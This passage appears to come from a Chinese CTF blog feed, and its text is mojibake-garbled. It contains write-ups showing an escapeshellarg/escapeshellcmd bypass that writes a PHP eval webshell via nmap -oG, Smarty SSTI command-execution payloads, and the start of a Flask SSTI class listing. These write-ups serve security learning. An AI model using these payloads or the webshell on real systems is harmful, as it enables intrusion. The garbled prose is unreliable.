class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;Â </span><br><span class="line"><span class="keyword">else</span>Â &#123; </span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">	<span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span> <span class="string">&#x27;youÂ areÂ inÂ sandboxÂ &#x27;</span>.<span class="variable">$sandbox</span>;  </span><br><span class="line">Â Â Â Â @mkdir(<span class="variable">$sandbox</span>); </span><br><span class="line">Â Â Â Â chdir(<span class="variable">$sandbox</span>);  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span> system(<span class="string">&quot;nmapÂ -T5Â -sTÂ -PnÂ --host-timeoutÂ 2Â -FÂ &quot;</span>.<span class="variable">$host</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></p>
<p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºä»¥ä¸‹å‡ ç‚¹ï¼š - ä»¥GETæ–¹å¼ä¼ å…¥ <code>host</code>ï¼› - <code>host</code> è¦ç»è¿‡ <code>escapeshellarg</code>ï¼Œ<code>escapeshellcmd</code> ä¸¤ä¸ªå‡½æ•°ã€‚ä½†æ˜¯å¯¹è¿™ä¸¤ä¸ªå‡½æ•°ç°åœ¨ä¸€æ— æ‰€çŸ¥ï¼› - <code>sandbox</code> å°±æ˜¯è·¯å¾„åœ°å€ï¼› - <code>system</code> å‡½æ•°è¯´æ˜æœ¬é¢˜åº”è¯¥æ˜¯å‘½ä»¤æ‰§è¡Œï¼›</p>
<p>ç°åœ¨æœ€å¤§çš„é—®é¢˜å°±æ˜¯ç¬¬äºŒç‚¹çš„ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨ã€‚</p>
<h1 id="escapeshellargå’Œescapeshellcmdä½œç”¨">escapeshellargå’Œescapeshellcmdä½œç”¨</h1>
<h2 id="escapeshellargå‡½æ•°">escapeshellargå‡½æ•°</h2>
<p>è¯­æ³•ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellarg ( <span class="keyword">string</span> <span class="variable">$arg</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>ä½œç”¨ï¼š å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚</p>
<p>çœ‹è§£é‡Šå¯èƒ½ä¸æ˜ç™½ä»€ä¹ˆæ„æ€ï¼Œæ¥ä¸‹æ¥çœ‹ä¸€ä¸ªä¾‹å­ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ° <code>escapeshellarg</code> ä¼šåœ¨æ‰€æœ‰å•å¼•å·å‰æ·»åŠ è½¬ä¹‰ç¬¦å·ï¼Œå˜æˆ <code>\'</code> ç„¶ååœ¨è¿™ä¸¤ä¸ªå­—ç¬¦å¤–é˜”ä¸Šå•å¼•å·<code>'\''</code>ã€‚å› æ­¤ï¼Œä¸Šè¿°ä¾‹å­ä¸­ä¼šå°†åŸæ¥çš„ <code>'</code> å˜æˆ <code>'\''</code>ï¼Œç„¶ååœ¨æ•´ä¸ªå­—ç¬¦ä¸²å¤–é¢æ·»åŠ å•å¼•å·ã€‚å›è¿‡å¤´çœ‹ <strong>å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·</strong> å°±å¾ˆæ˜ç¡®äº†ã€‚</p>
<h2 id="escapeshellcmdå‡½æ•°">escapeshellcmdå‡½æ•°</h2>
<p>è¯­æ³•ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellcmd(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>ä½œç”¨ï¼š escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;  #  ; `  |  *  ?  ~  &lt;  &gt;  ^  (  )  [  ]  &#123;  &#125;  $  \, \x0A  \xFF</span><br></pre></td></tr></table></figure> <code>'</code>å’Œ <code>"</code> ä»…åœ¨ä¸é…å¯¹çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p>
<p>çœ‹ä¸€ä¸ªä¾‹å­ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host2</span> = escapeshellcmd(<span class="variable">$host1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br><span class="line">&#x27;\&lt;\?php phpinfo\(&#x27;\\&#x27;&#x27;x&#x27;\\&#x27;&#x27;\)\;\?\&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°å®ƒåœ¨ä¼—å¤šç¬¦å·é¢å‰éƒ½æ·»åŠ äº†è½¬ç§»ç¬¦å· <code>\</code> ã€‚</p>
<h2 id="ä¸¤è€…ä¸€èµ·ç”¨çš„æ¼æ´">ä¸¤è€…ä¸€èµ·ç”¨çš„æ¼æ´</h2>
<p>ä¾‹å­æ¥æºäºï¼š<a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p>
<ol type="1">
<li>å‡è®¾ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š<code>172.17.0.2' -v -d a=1</code></li>
<li>ç»è¿‡<code>escapeshellarg</code>å¤„ç†åå˜æˆäº†<code>'172.17.0.2'\'' -v -d a=1'</code>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</li>
<li>ç»è¿‡<code>escapeshellcmd</code>å¤„ç†åå˜æˆ<code>'172.17.0.2'\\'' -v -d a=1\'</code>ï¼Œè¿™æ˜¯å› ä¸º<code>escapeshellcmd</code>å¯¹<code>\</code>ä»¥åŠæœ€åé‚£ä¸ª<strong>ä¸é…å¯¹</strong>çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ã€‚</li>
<li>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯<code>curl '172.17.0.2'\\'' -v -d a=1\'</code>ï¼Œç”±äºä¸­é—´çš„<code>\\</code>è¢«è§£é‡Šä¸º<code>\</code>è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<code>'</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„<code>'</code>é…å¯¹æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸º<code>curl 172.17.0.2\ -v -d a=1'</code>ï¼Œå³å‘<code>172.17.0.2\</code>å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸º<code>a=1'</code>ã€‚</li>
</ol>
<p>æ€»è€Œè¨€ä¹‹ï¼š</p>
<ul>
<li>escapeshellarg
<ul>
<li>ç¡®ä¿ç”¨æˆ·åªä¼ é€’ä¸€ä¸ªå‚æ•°ï¼ˆåœ¨æ•´ä¸ªå¤–é¢æ·»åŠ å•å¼•å·ï¼Œä½¿å­—ç¬¦ä¸²æˆä¸ºä¸€ä¸ªæ•´ä½“ï¼‰</li>
<li>ç”¨æˆ·ä¸èƒ½æŒ‡å®šæ›´å¤šçš„å‚æ•°</li>
<li>ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤ï¼ˆä¸€èˆ¬ <code>127.0.0.1;ls</code>ï¼Œåœ¨å¤–é¢æ·»åŠ å•å¼•å·ä½¿ <code>;</code> ä¸å‰åæ–‡å˜æˆæ•´ä½“ï¼Œå› æ­¤æ— æ³•å®ç°æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼‰</li>
</ul></li>
<li>escapeshellcmd
<ul>
<li>ç¡®ä¿ç”¨æˆ·åªæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼ˆä¼šåœ¨è½å•çš„å¼•å·å‰æ·»åŠ è½¬ä¹‰å­—ç¬¦ä½¿å…¶å¤±å»é—­åˆå‰é¢å¼•å·çš„ä½œç”¨ï¼‰</li>
<li>ç”¨æˆ·å¯ä»¥æŒ‡å®šä¸é™é‡çš„å‚æ•°</li>
<li>ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤ï¼ˆ<code>;  $  |</code> ç­‰ç¬¦å·éƒ½ä¼šè¢«æ·»åŠ è½¬ä¹‰å­—ç¬¦ä½¿å…¶å¤±å»åŠŸèƒ½ï¼Œå˜æˆå­—ç¬¦æœ¬èº«ï¼‰</li>
</ul></li>
</ul>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>æœ¬é¢˜å…¶å®è¿˜æ¶‰åŠ nmap çš„å‚æ•°ï¼Œnmap å¯ä»¥ç”¨ <code>-oG</code> å°†æ‰§è¡Œç»“æœå†™å…¥æ–‡ä»¶ã€‚</p>
<p>è¯­æ³•ï¼š <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap [ä»»æ„å†…å®¹] -oG fileName</span><br></pre></td></tr></table></figure></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç»†èŠ‚æ–¹é¢çš„è®¨è®ºäº†ã€‚å°±æ˜¯å¦‚ä½•ç»•è¿‡å‰é¢æ‰€è¯´çš„ä¸¤ä¸ªå‡½æ•°ã€‚æˆ‘ä»¬éœ€è¦å†™å…¥æ–‡ä»¶çš„è‚¯å®šæ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œå› æ­¤payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>ç»è¿‡ä¸¤æ¬¡å‡½æ•°åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>è¿™æ ·å­ <code>-oG</code> ä¸ä¸Šä¸‹æ–‡å˜æˆä¸€ä¸ªæ•´ä½“ï¼Œæ— æ³•è¢«å½“ä½œå‚æ•°æ‰§è¡Œã€‚å› æ­¤éœ€è¦æŠŠå•å¼•å·å»æ‰ï¼Œåªè¦æœ€å‰é¢æ·»åŠ å•å¼•å·å°±å¯ä»¥æŠŠåé¢é‡Šæ”¾å‡ºæ¥ã€‚ä¿®æ”¹åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>ç»è¿‡ä¸¤æ¬¡å‡½æ•°åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>ç”±äº <code>\\</code> ä½¿åè€…ä¸ä½œä¸ºè½¬ç§»ç¬¦å·ï¼Œå› æ­¤ç¬¬ä¸‰ä¸ªå•å¼•å·è¿˜èƒ½èµ·ä½œç”¨ï¼Œä¸ç¬¬å››ä¸ªå•å¼•å·æˆå¯¹ï¼Œå•å¼•å·å†…å®¹ä¸ºç©ºï¼Œå¯ä»¥å»æ‰ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>äºæ˜¯ <code>oG</code> å¯ä»¥è¢«æˆåŠŸæ‰§è¡Œï¼Œä½†æ˜¯æ­¤æ—¶å‰é¢çš„æœ¨é©¬å†™å…¥çš„æ–‡ä»¶çš„åå­—ä¸º <code>shell.php'</code> ã€‚ï¼ˆ<strong>æˆ‘ç”±äºå·²ç»åšå®Œäº†ï¼Œä¸‹é¢èšå‰‘è¿æ¥åªæ˜¯ä½œä¸ºè¯æ˜ï¼Œä»¥ä¾¿ç†è§£</strong>ï¼‰ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191734.png" /></p>
<p>å†…å®¹ä¸ºï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191747.png" /> ï¼ˆ<code>\\</code> ä½¿åè€…å¤±å»è½¬ä¹‰åŠŸèƒ½ï¼Œä»…ä»…ä½œä¸º <code>\</code>ï¼Œå› æ­¤æœ¨é©¬æœ€å‰é¢æœ‰ä¸€ä¸ª <code>\</code>ï¼‰</p>
<p>ä¸æ˜¯ <code>php</code> æ–‡ä»¶ï¼Œæ— æ³•è¿æ¥ã€‚æ¥ä¸‹éœ€è¦æŠŠåé¢çš„å•å¼•å·ä¹Ÿè¦å»æ‰ï¼Œå› æ­¤åœ¨åé¢ä¹Ÿæ·»åŠ å•å¼•å·ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>ç»è¿‡ä¸¤æ¬¡å‡½æ•°åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>ç®€åŒ–åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>æ³¨æ„ï¼Œå‰é¢çš„ <code>''\\''</code> å› ä¸ºå‰é¢çš„ä¸¤ä¸ªå•å¼•å·æˆå¯¹ï¼Œå› æ­¤ <code>\\</code> ä¸è¢«å•å¼•å·åŒ…æ‹¬ï¼Œä¹Ÿå°±æ˜¯ä¸æ˜¯å­—ç¬¦ä¸²ï¼›è€Œåè€… <code>'\\'''</code>ä¸­<code>\\</code>è¢«å•å¼•å·åŒ…æ‹¬ï¼Œå› æ­¤å‰ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ä¸æ‰§è¡Œè½¬ä¹‰å­—ç¬¦ï¼Œè€Œæ˜¯è¢«å½“ä½œæ™®é€šçš„å­—ç¬¦ã€‚</p>
</blockquote>
<p>å› æ­¤æœ€åç”Ÿæˆçš„æ–‡ä»¶åä¸º <code>shell.php\\</code>ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192825.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192834.png" /></p>
<p>è§£å†³åŠæ³•ä¹Ÿå¾ˆç®€å•ï¼Œé‚£å°±æ˜¯åŠ ä¸€ä¸ªç©ºæ ¼å°±å¥½ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php &#x27;</span><br></pre></td></tr></table></figure></p>
<p>ç»è¿‡ä¸¤æ¬¡å‡½æ•°åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>ç®€åŒ–åï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶ç›¸å½“äºæŠŠ <strong>æœ¨é©¬</strong> å’Œ <code>\\</code> ä¸€èµ·å†™å…¥äº†æ–‡ä»¶ã€‚è·¯å¾„å¦‚ä¸‹ï¼Œæ³¨æ„åˆ«æŠŠ <code>Starting</code> ä¹Ÿå½“ä½œè·¯å¾„ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322193312.png" /></p>
<p>ç”¨èšå‰‘è¿æ¥å³å¯ã€‚flagåœ¨æ ¹ç›®å½•ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>RCE</tag>
        <tag>nmapå‘½ä»¤</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019 åä¸œå—èµ›åŒº Web11</title>
    <url>/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BCISCN2019%20åä¸œå—èµ›åŒº%5DWeb11">Web11</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œçœ‹åˆ°äº†ä¸€å †ä¿¡æ¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121336.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121350.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121357.png" /></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>é¦–å…ˆï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹API Usageï¼Œå…ˆåè®¿é—®äº†<code>http://node4.buuoj.cn:29398/api</code>å’Œ<code>http://node4.buuoj.cn:29398/xff</code>ï¼Œå‘ç°çŠ¶æ€ç éƒ½ä¸º301ã€‚</p>
<p>æ¥ç€æˆ‘å°è¯•äº†ä¸€ä¸‹Connectionä¸­çš„è¯·æ±‚å¤´ï¼Œå¾—åˆ°çŠ¶æ€ç 500ã€‚</p>
<p>æœ€åçœ‹åˆ°äº†<code>build with smarty</code>ï¼Œå¯èƒ½æš—ç¤ºç€å­˜åœ¨SSTIï¼Œå¹¶ä¸”æ¸²æŸ“å¼•æ“ä¸ºsmartyã€‚é¦–å…ˆå°è¯•äº†ä¸€ä¸‹<code>http://node4.buuoj.cn:29398/$&#123;7*7&#125;</code>ï¼Œç»“æœå¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121736.png" /></p>
<p>è¿™ä¸åº”è¯¥å‘€ï¼Œå¦‚æœè¯´ç¡®å®æ¸²æŸ“å¼•æ“ç¡®å®ä¸ºsmartyçš„è¯ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„åº”è¯¥æ˜¯<code>$49</code>ã€‚æ€æ¥æƒ³å»ï¼Œæˆ‘æ³¨æ„åˆ°äº†urlï¼Œæˆ‘çš„è¾“å…¥å±…ç„¶å˜æˆäº†<code>$%7B7*7%7D</code>ï¼Œé‚£ä¹ˆè‡ªç„¶ä¸ä¼šè¢«smartyç»™è¯†åˆ«æˆä»£ç æ‰§è¡Œã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘å°è¯•ç”¨burpå‘é€è¯·æ±‚ã€‚ç»ˆäº</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121940.png" /></p>
<p>ç¡®å®šäº†è¿™é‡Œå­˜åœ¨SSTIï¼Œé‚£æ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ã€‚å¯ä»¥å…ˆç”¨<code>$&#123;smarty.version</code>æŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ï¼Œçœ‹ä¸€ä¸‹èƒ½å¦åˆ©ç”¨ä¸€äº›æ ‡ç­¾ã€‚æˆ‘è¿™é‡Œç›´æ¥ä½¿ç”¨å‘½ä»¤æ‰§è¡Œï¼Œpayloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&quot;ls /&quot;)&#125; # æ‰¾åˆ°flagæ–‡ä»¶åœ¨æ ¹ç›®å½•ä¸‹</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122203.png" /></p>
<p>ç„¶åè¯»å–flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122245.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¿™æ˜¯ä¸€é“å…³äºSSTIçš„ç®€å•é¢˜ç›®ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ä¸èƒ½ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥payloadï¼Œå¦åˆ™ä¼šè¢«urlç¼–ç ï¼Œå¯¼è‡´smartyä¸èƒ½è¯†åˆ«ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCCTF 2019 Qual FlaskLight</title>
    <url>/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BCSCCTF%202019%20Qual%5DFlaskLight">FlaskLight</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥é¡µé¢æŸ¥çœ‹æºç å¾—åˆ°æç¤ºä¿¡æ¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Parameter Name: search --&gt;</span><br><span class="line">&lt;!-- Method: GET --&gt;</span><br></pre></td></tr></table></figure></p>
<p>ç»è¿‡æµ‹è¯•ï¼Œè¿™é‡Œç¡®å®å­˜åœ¨ç€SSTIã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>é¦–å…ˆå¯»æ‰¾å¯ä»¥ç”¨çš„ç±»ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0. type &#x27;type&#x27;</span><br><span class="line">1. type &#x27;weakref&#x27;</span><br><span class="line">2. type &#x27;weakcallableproxy&#x27;</span><br><span class="line">3. type &#x27;weakproxy&#x27;</span><br><span class="line">4. type &#x27;int&#x27;</span><br><span class="line">5. type &#x27;basestring&#x27;</span><br><span class="line">6. type &#x27;bytearray&#x27;</span><br><span class="line">7. type &#x27;list&#x27;</span><br><span class="line">8. type &#x27;NoneType&#x27;</span><br><span class="line">9. type &#x27;NotImplementedType&#x27;</span><br><span class="line">10. type &#x27;traceback&#x27;</span><br><span class="line">11. type &#x27;super&#x27;</span><br><span class="line">12. type &#x27;xrange&#x27;</span><br><span class="line">13. type &#x27;dict&#x27;</span><br><span class="line">14. type &#x27;set&#x27;</span><br><span class="line">15. type &#x27;slice&#x27;</span><br><span class="line">16. type &#x27;staticmethod&#x27;</span><br><span class="line">17. type &#x27;complex&#x27;</span><br><span class="line">18. type &#x27;float&#x27;</span><br><span class="line">19. type &#x27;buffer&#x27;</span><br><span class="line">20. type &#x27;long&#x27;</span><br><span class="line">21. type &#x27;frozenset&#x27;</span><br><span class="line">22. type &#x27;property&#x27;</span><br><span class="line">23. type &#x27;memoryview&#x27;</span><br><span class="line">24. type &#x27;tuple&#x27;</span><br><span class="line">25. type &#x27;enumerate&#x27;</span><br><span class="line">26. type &#x27;reversed&#x27;</span><br><span class="line">27. type &#x27;code&#x27;</span><br><span class="line">28. type &#x27;frame&#x27;</span><br><span class="line">29. type &#x27;builtin_function_or_method&#x27;</span><br><span class="line">30. type &#x27;instancemethod&#x27;</span><br><span class="line">31. type &#x27;function&#x27;</span><br><span class="line">32. type &#x27;classobj&#x27;</span><br><span class="line">33. type &#x27;dictproxy&#x27;</span><br><span class="line">34. type &#x27;generator&#x27;</span><br><span class="line">35. type &#x27;getset_descriptor&#x27;</span><br><span class="line">36. type &#x27;wrapper_descriptor&#x27;</span><br><span class="line">37. type &#x27;instance&#x27;</span><br><span class="line">38. type &#x27;ellipsis&#x27;</span><br><span class="line">39. type &#x27;member_descriptor&#x27;</span><br><span class="line">40. type &#x27;file&#x27;</span><br><span class="line">41. type &#x27;PyCapsule&#x27;</span><br><span class="line">42. type &#x27;cell&#x27;</span><br><span class="line">43. type &#x27;callable-iterator&#x27;</span><br><span class="line">44. type &#x27;iterator&#x27;</span><br><span class="line">45. type &#x27;sys.long_info&#x27;</span><br><span class="line">46. type &#x27;sys.float_info&#x27;</span><br><span class="line">47. type &#x27;EncodingMap&#x27;</span><br><span class="line">48. type &#x27;fieldnameiterator&#x27;</span><br><span class="line">49. type &#x27;formatteriterator&#x27;</span><br><span class="line">50. type &#x27;sys.version_info&#x27;</span><br><span class="line">51. type &#x27;sys.flags&#x27;</span><br><span class="line">52. type &#x27;exceptions.BaseException&#x27;</span><br><span class="line">53. type &#x27;module&#x27;</span><br><span class="line">54. type &#x27;imp.NullImporter&#x27;</span><br><span class="line">55. 